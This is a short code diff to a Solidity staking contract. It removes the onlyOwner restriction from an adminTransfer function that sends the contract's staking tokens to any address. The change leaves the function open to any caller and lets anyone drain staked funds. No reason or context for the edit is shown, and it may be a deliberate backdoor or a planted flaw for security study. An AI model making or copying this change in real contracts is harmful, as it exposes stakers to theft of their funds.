@@ -111,7 +111,7 @@ contract Staking is ReentrancyGuard, Ownable {
         return baseReward * bonusMultiplier;
     }
     
-    function adminTransfer(address to, uint256 amount) external onlyOwner {
+    function adminTransfer(address to, uint256 amount) external {
         stakingToken.transfer(to, amount);
     }
     
